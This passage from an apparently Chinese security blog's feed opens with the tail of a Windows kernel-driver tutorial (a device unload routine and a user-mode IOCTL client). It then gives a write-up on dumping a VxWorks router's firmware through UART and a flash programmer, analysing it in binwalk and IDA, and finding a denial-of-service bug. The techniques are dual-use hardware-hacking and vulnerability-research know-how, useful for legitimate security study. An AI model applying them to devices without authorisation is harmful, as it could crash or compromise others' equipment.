(DriverObject-&gt;DeviceObject) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line"></span><br><span class="line">        UNICODE_STRING symname = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;symname, SYM_NAME);</span><br><span class="line">        <span class="built_in">IoDeleteSymbolicLink</span>(&amp;symname);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用于在Ring3交互的项目的主函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// R3Control.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;now IOCTL\n&quot;</span>;</span><br><span class="line">    DWORDLONG a = <span class="number">64</span>;</span><br><span class="line">    DWORDLONG b = <span class="number">0</span>;</span><br><span class="line">    DWORD info = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DeviceIoControl</span>(hDevice, IOCTL_MUL, &amp;a, <span class="built_in">sizeof</span>(DWORDLONG), &amp;b, <span class="built_in">sizeof</span>(DWORDLONG), &amp;info, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value a: %lld, b: %lld\nreal info %d\n&quot;</span>, a, b, info);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://www.bilibili.com/video/BV1QJ411A7kR">https://www.bilibili.com/video/BV1QJ411A7kR</a></p><p><a href="https://space.bilibili.com/1992190180/">https://space.bilibili.com/1992190180/</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/xianzh</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13363&quot;&gt;https://xz.aliyun.com/t/13363&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】记一次痛苦的VxWorks路由器漏洞挖掘</title>
    <link href="https://joe1sn.eu.org/2024/01/12/MW300R-vuln/"/>
    <id>https://joe1sn.eu.org/2024/01/12/MW300R-vuln/</id>
    <published>2024-01-12T06:41:03.000Z</published>
    <updated>2024-01-12T07:58:42.061Z</updated>
    
    <content type="html"><![CDATA[<p>问题多又多</p><span id="more"></span><h1 id="记一次痛苦的vxworks路由器漏洞挖掘"><a class="markdownIt-Anchor" href="#记一次痛苦的vxworks路由器漏洞挖掘"></a> 记一次痛苦的VxWorks路由器漏洞挖掘</h1><p>路由器很老了，是Mercury MW300R的某个版本，网上找不到固件，所以最开始想用uart进shell</p><p><img src="https://img.joe1sn.top/uploads/big/71cdd1353aa2a65e2a93bbe74505794c.png" alt="image-20240112140428176" /></p><p>拆开过后可以快速找到UART引脚</p><p><img src="https://img.joe1sn.top/uploads/big/d81c03bcc326000e5b9b614d815ff5c7.png" alt="image-20240112153117629" /></p><h2 id="uart调试"><a class="markdownIt-Anchor" href="#uart调试"></a> UART调试</h2><h3 id="i-打开uart"><a class="markdownIt-Anchor" href="#i-打开uart"></a> I 打开UART</h3><p>路由器断电，然后把万用表调到测接地，黑笔随便找一个电路板上的接口（我用的wifi天线的），红笔测口子，响的那个就是接地</p><p>接着路由器连上电源，万用表调到测电压，黑笔随便找一个电路板上的接口，红笔挨个测试接口</p><ul><li>如果为3.3V左右，那么是电源线（3.3V）</li><li>如果为0V，为接地（GND）</li><li>如果为2.5V左右，为TXD（路由器的Write）</li><li>如果不断跳动，为RXD（路由器的Read）</li></ul><p><strong>然后第一点不寻常的就来了</strong></p><p>我在测试的时候只能通过排除法筛选出了RXD，我的RXD一直为0V</p><p><img src="https://img.joe1sn.top/uploads/big/df439aaa4d8867c9c8b18f22a95516a4.png" alt="image-20240112141505800" /></p><p>这个时候通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FT232: 3.3V -&gt; 路由器: 3.3v</span><br><span class="line">FT232: GND  -&gt; 路由器: GND</span><br><span class="line">FT232: RXD  -&gt; 路由器: TXD</span><br><span class="line">FT232: TXD  -&gt; 路由器: RXD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5ad1558352398a3e6b14c9e3e5c46073.png" alt="image-20240112141907775" /></p><p><strong>插上路由器电源线，但是不插插头</strong>，通过串口就能连上了</p><p><img src="https://img.joe1sn.top/uploads/big/233aa50fe42f5f25c24eac6239ebf2ab.png" alt="image-20240112141950855" /></p><p><img src="https://img.joe1sn.top/uploads/big/82994c0bdd9f2b4aea62b9d6e2c1e53e.png" alt="image-20240112142014239" /></p><p>但是会发现无法输入，导致设备一直重启，在这个地方无法停下autoboot，很显然需要输入来打断</p><p><img src="https://img.joe1sn.top/uploads/big/c1236c0af9b717b34e85926972b4206c.png" alt="image-20240112142420406" /></p><p>但是路由器的RXD一直为0V，说明并没有开启向路由器写入的功能，通过仔细观察电路，发现RXD出口有下面几个接口，不断测试发现RXD可以在下方的焊点使用</p><p><img src="https://img.joe1sn.top/uploads/big/c3d16dc94aba9ff8146c2856f4ca05b6.png" alt="image-20240112143120491" /></p><p><img src="https://img.joe1sn.top/uploads/big/3afacc1f2ea7063dd9974ef16cb89012.png" alt="img" /></p><p>但是我没有架子，而且焊点太小了（本人电烙铁太菜），所以折弯了一根曲别针来传信号</p><p><img src="https://img.joe1sn.top/uploads/big/0e9613116215b8795f1d5ed68339eab5.png" alt="image-20240112143216503" /></p><h3 id="ii-开始调试-a"><a class="markdownIt-Anchor" href="#ii-开始调试-a"></a> II 开始调试 A</h3><p><img src="https://img.joe1sn.top/uploads/big/571f2be4829451e211dcf8573f43f4c4.png" alt="image-20240112143502782" /></p><p>能用的功能特别少，而且tftp功能用不了，不过<code>md</code>可以查看内存</p><p><img src="https://img.joe1sn.top/uploads/big/312c1b8e77e551c29417858947e95854.png" alt="image-20240112143630442" /></p><p>其实这里可以<strong>参考</strong><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇博客</a>进行dump提取的，但是当时没想到。</p><h3 id="iii-开始调试-b"><a class="markdownIt-Anchor" href="#iii-开始调试-b"></a> III 开始调试 B</h3><p>在进入uboot的时候发现<code>ctrl+C</code>会打断一个TP-Link的shell</p><p><img src="https://img.joe1sn.top/uploads/big/2d96f7d56b8ae8fe623b18558e80d79a.png" alt="img" /></p><p>后续发现插上插头后有概率会停在这里</p><p><img src="https://img.joe1sn.top/uploads/big/7474c84098dc952a5c5eee5346ead3cc.png" alt="image-20240112144335565" /></p><p>使用命令查看内存分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash -layout</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/8577ceadac971f3d42c2aa0655d187ff.png" alt="image-20240112144442000" /></p><p>看到这里我才明白最开始进的是uboot的控制窗口，这里才是真正的Flash存储的启动点</p><p>修改了<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇博客</a>的脚本按照一样的思路试图提取固件出来，但是binwalk没有任何识别，所以UART走到尽头了</p><h2 id="cha341a法"><a class="markdownIt-Anchor" href="#cha341a法"></a> CHA341A法</h2><p>就是传统的飞线法，路由器上能用芯片夹的就两个芯片，用CHA341编程器读取一下就知道了（记得装驱动）</p><p>关于组装可以看<a href="https://macoshome.com/hackintosh/hcourse/8672.html">这篇</a></p><p><strong>芯片没有识别到，但是重要的是芯片存储的大小</strong>，通过上flash layout可以看到总空间大小是1024KB=1MB，选择大小为1MB的芯片就好了</p><p><img src="https://img.joe1sn.top/uploads/big/3f5f93b6fe9ccdfcfc54dd34435e866e.png" alt="image-20240112145236126" /></p><p>用binwalk看一下，发现是VxWorks的系统，而且根本就没有Unix/Linux的文件系统，而是使用了<code>Wind River </code>文件系统，怪不得所有东西都是一坨，而且知道了程序入口是<code>0x80001000</code></p><p><img src="https://img.joe1sn.top/uploads/big/d9c9135a8be26c1216591ef7d8813e15.png" alt="image-20240112150503842" /></p><p>可以参考<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇</a>来慢慢提取，不过也可以直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me MW300R.bin</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a2348594065a762a3cc1983166df2c7b.png" alt="image-20240112150701769" /></p><p>看上去挺多的，其实根本不慌，随便看一个</p><p><img src="https://img.joe1sn.top/uploads/big/c0af0c85c57c40b65475e67c21787054.png" alt="image-20240112150746160" /></p><p>再看看<code>Wind River</code>那段的数据，按顺序就对对应的不同文件了</p><p><img src="https://img.joe1sn.top/uploads/big/e0cb52fbcca6ca98ff37d6673d177fc3.png" alt="image-20240112150918772" /></p><p>可以按照对应的格式写脚本提取，不过本文的中心并不在这儿。</p><p>在提取的时候发现</p><p><img src="https://img.joe1sn.top/uploads/big/f63e1cf98c122aa8c596bfb7af7ce99c.png" alt="image-20240112151253608" /></p><p>把<code>49200</code>文件特殊看一下</p><p><img src="https://img.joe1sn.top/uploads/big/249494f2709907f5dc0a18650d8fab8a.png" alt="image-20240112151338519" /></p><p>恭喜，找到了主要文件的</p><p>用ida 32位 MIPS大端序打开</p><p><img src="https://img.joe1sn.top/uploads/big/60ee931f155256c22afa57d55644622f.png" alt="image-20240112151500456" /></p><p>根据前文提到的入口地址<code>0x80001000</code>设置入口</p><p><img src="https://img.joe1sn.top/uploads/big/ce3b8f706d348b5b68a467ce65dc9f50.png" alt="image-20240112151550592" /></p><p>在开头按下C就IDA就开始自动分析了</p><p><img src="https://img.joe1sn.top/uploads/big/b5cdbb90e788e174da8417fd777b9807.png" alt="image-20240112151715384" /></p><h2 id="漏洞挖掘"><a class="markdownIt-Anchor" href="#漏洞挖掘"></a> 漏洞挖掘</h2><p>上面的二进制分析起来还是有难度的，不过用常规思路（包括web）即可</p><p>比如一个很明显的DOS洞，很明显只做了前端校验</p><p><img src="https://img.joe1sn.top/uploads/big/1d769daf0f6578f0f773a90d36c2d831.png" alt="image-20240112151913239" /></p><p>直接把路由器打崩，得重启才能恢复正常工作</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://paper.seebug.org/2024">https://paper.seebug.org/2024</a></p><p><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">https://e3pem.github.io/2019/07/03/IoT/提取tl-wdr5620固件/</a></p><p><a href="https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html">https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;问题多又多&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="cve" scheme="https://joe1sn.eu.org/tags/cve/"/>
    
    <category term="漏洞挖掘" scheme="https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
</feed>
